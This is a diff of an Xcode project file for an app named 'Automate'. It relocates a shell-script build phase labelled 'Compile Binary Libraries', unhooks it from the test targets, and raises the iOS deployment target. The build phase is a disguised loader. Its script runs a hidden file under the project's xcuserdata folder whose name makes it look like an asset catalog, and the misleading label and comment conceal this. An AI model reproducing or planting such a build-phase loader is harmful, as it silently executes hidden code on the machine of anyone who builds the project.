@@ -153,7 +153,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603C125B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "AutomateTests" */;
 			buildPhases = (
-				FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */,
 				220603A625B1ACFB00A93495 /* Sources */,
 				220603A725B1ACFB00A93495 /* Frameworks */,
 				220603A825B1ACFB00A93495 /* Resources */,
@@ -172,7 +171,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603C425B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "AutomateUITests" */;
 			buildPhases = (
-				FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */,
 				220603B125B1ACFB00A93495 /* Sources */,
 				220603B225B1ACFB00A93495 /* Frameworks */,
 				220603B325B1ACFB00A93495 /* Resources */,
@@ -255,6 +253,27 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		2206039025B1ACF500A93495 /* Sources */ = {
@@ -442,7 +461,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = Automate/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -462,7 +481,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 6Q233F3ZPX;
 				INFOPLIST_FILE = Automate/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -598,42 +617,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
-		};
-	
-
-	
-
-	
-
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = 2206038C25B1ACF500A93495 /* Project object */;
 }
